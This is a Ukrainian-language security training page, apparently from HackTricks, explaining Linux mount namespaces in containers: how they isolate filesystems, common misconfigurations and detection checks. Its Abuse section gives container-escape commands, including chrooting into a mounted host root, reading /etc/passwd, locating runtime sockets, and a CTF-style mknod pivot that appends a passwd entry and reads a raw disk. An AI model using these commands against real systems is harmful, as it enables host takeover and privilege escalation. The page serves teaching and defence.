# Простір імен монтувань

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен монтувань контролює **таблицю монтувань**, яку бачить процес. Це одна з найважливіших функцій ізоляції контейнерів, оскільки коренева файлова система, bind mounts, tmpfs mounts, вигляд procfs, експозиція sysfs та багато допоміжних монтувань, специфічних для рантайму, представлені саме через цю таблицю монтувань. Два процеси можуть обидва отримувати доступ до `/`, `/proc`, `/sys` або `/tmp`, але те, до чого ці шляхи резольвуються, залежить від простору імен монтувань, у якому вони знаходяться.

З погляду безпеки контейнера, простір імен монтувань часто є тією різницею між «це акуратно підготовлена файлова система додатку» і «цей процес може безпосередньо бачити або впливати на файлову систему хоста». Саме тому bind mounts, `hostPath` volumes, привілейовані операції монтовання та можливість запису у `/proc` або `/sys` пов'язані з цим простором імен.

## Робота

Коли runtime запускає контейнер, він зазвичай створює новий простір імен монтувань, готує кореневу файлову систему для контейнера, монтує procfs та інші допоміжні файлові системи за потреби, а потім опційно додає bind mounts, tmpfs mounts, secrets, config maps або host paths. Після того як процес запущений у цьому просторі імен, набір монтувань, який він бачить, значною мірою відокремлений від стандартного вигляду хоста. Хост усе ще може бачити реальну підлеглу файлову систему, але контейнер бачить ту версію, зібрану для нього runtime-ом.

Це потужно, оскільки дозволяє контейнеру вважати, що у нього є власна коренева файлова система, навіть якщо хост усе ще керує всім. Це також небезпечно, бо якщо runtime експонує невірний mount, процес раптово отримає видимість ресурсів хоста, які решта моделі безпеки могла не передбачати захищати.

## Лаб

You can create a private mount namespace with:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Якщо ви відкриєте інший shell поза цією namespace і переглянете mount table, ви побачите, що tmpfs mount існує лише всередині ізольованого mount namespace. Це корисна вправа, бо показує, що mount isolation — не абстрактна теорія; kernel буквально показує процесу іншу mount table.
Якщо ви відкриєте інший shell поза цією namespace і переглянете mount table, tmpfs mount буде існувати лише всередині ізольованого mount namespace.

Всередині containers, швидке порівняння таке:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Другий приклад демонструє, наскільки легко конфігурація середовища виконання може пробити велику діру в межі файлової системи.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all rely on a private mount namespace for normal containers. Kubernetes builds on top of the same mechanism for volumes, projected secrets, config maps, and `hostPath` mounts. Incus/LXC environments also rely heavily on mount namespaces, especially because system containers often expose richer and more machine-like filesystems than application containers do.

Це означає, що коли ви розглядаєте проблему з файловою системою контейнера, зазвичай ви дивитесь не на ізольований баг Docker. Ви маєте справу з проблемою простору імен монтованих файлових систем і конфігурації середовища виконання, проявленою через ту платформу, яка запустила робоче навантаження.

## Misconfigurations

Найочевидніша й найнебезпечніша помилка — відкриття файлової системи кореня хоста або іншого чутливого шляху хоста через bind mount, наприклад `-v /:/host` або записуваний `hostPath` у Kubernetes. В цьому разі питання вже не "чи може контейнер якось вирватися?", а "яка частина корисного вмісту хоста вже безпосередньо видима та доступна для запису?" Записуваний host bind mount часто перетворює решту експлойту на просту справу розміщення файлів, chrooting, зміну конфігурації або виявлення runtime сокетів.

Ще одна поширена проблема — відкриття хостових `/proc` або `/sys` таким чином, що обходиться безпечніший контейнерний вигляд. Ці файлові системи — не звичайні монтажі даних; це інтерфейси до стану ядра та процесів. Якщо робоче навантаження отримує доступ безпосередньо до хостових версій, багато припущень, на яких базується жорстке захищення контейнерів, перестають коректно застосовуватись.

Захист тільки від запису теж має значення. Root filesystem в режимі read-only не чарівно робить контейнер захищеним, але він позбавляє атакувальника великої кількості простору для підготовки і ускладнює персистентність, розміщення допоміжних бінарних файлів і підробку конфігурацій. Навпаки, записуваний root або записуваний host bind mount дає атакувальнику можливість підготувати наступний крок.

## Abuse

Коли простір імен монтів використовується неправильно, атакувальники зазвичай роблять одну з чотирьох речей. Вони **читають дані хоста**, які мали залишатися за межами контейнера. Вони **змінюють конфігурацію хоста** через записувані bind mounts. Вони **монтують або перемонтовують додаткові ресурси**, якщо дозволяють capabilities і seccomp. Або вони **отримують доступ до потужних сокетів та директорій стану runtime**, які дозволяють їм запитувати в самого контейнерного платформного стеку більше доступу.

Якщо контейнер уже бачить файлову систему хоста, решта моделі безпеки змінюється миттєво.

Коли ви підозрюєте host bind mount, спочатку підтвердіть, що доступно і чи це записувано:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Якщо коренева файлова система хоста змонтована як read-write, прямий доступ до хоста часто буває настільки простим:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Якщо метою є privileged runtime access, а не пряме chrooting, перелічіть sockets і runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Якщо `CAP_SYS_ADMIN` присутній, також перевірте, чи можна створювати нові mounts зсередини контейнера:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Повний приклад: Two-Shell `mknod` Pivot

Більш спеціалізований шлях зловживання виникає, коли root-користувач контейнера може створювати блокові пристрої, хост і контейнер ділять ідентичність користувача корисним чином, і зловмисник уже має закріплення з низькими привілеями на хості. У такій ситуації контейнер може створити вузол пристрою, наприклад `/dev/sda`, а користувач хоста з низькими привілеями пізніше може прочитати його через `/proc/<pid>/root/` для відповідного процесу контейнера.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
З хоста, від імені відповідного low-privilege user після знаходження container shell PID:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Важливий урок — не в точному CTF-пошуку рядків. Справжня суть у тому, що витік mount-namespace через `/proc/<pid>/root/` може дозволити користувачу хоста повторно використовувати вузли пристроїв, створені контейнером, навіть коли політика пристроїв cgroup забороняла їх пряме використання всередині самого контейнера.

## Перевірки

Ці команди показують подання файлової системи, у якому фактично працює поточний процес. Мета — виявити маунти, що походять із хоста, чутливі шляхи з правом запису та все, що виглядає ширшим за звичайну кореневу файлову систему контейнера додатку.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Що тут цікаво:

- Bind mounts з хоста, особливо `/`, `/proc`, `/sys`, директорії стану виконання або розташування сокетів, мають одразу кидатися в очі.
- Неочікувані маунти з правами читання/запису зазвичай важливіші, ніж велика кількість допоміжних маунтів лише для читання.
- `mountinfo` часто є найкращим місцем, щоб побачити, чи шлях дійсно походить із хоста або підтримується overlay.

Ці перевірки встановлюють **які ресурси видимі в цьому namespace**, **які з них походять із хоста**, і **які з них доступні для запису або є чутливими з точки зору безпеки**.
